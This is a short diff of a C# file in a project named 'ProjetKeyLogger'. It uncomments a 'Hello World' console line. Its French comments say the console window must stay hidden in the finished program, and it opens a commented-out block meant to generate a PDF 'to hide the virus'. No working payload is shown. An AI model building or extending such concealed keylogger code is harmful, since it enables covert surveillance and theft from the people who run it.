@@ -15,7 +15,7 @@ namespace ProjetKeyLogger
         static void Main()
         {
             //Ligne a supprimer la console ne devra surtout pas s'afficher une fois le progamme créé
-            //Console.WriteLine("Hello World!");
+            Console.WriteLine("Hello World!");
             /*
             //Génere un document PDF pour dissimuler le virus
             var pdf = new Process();
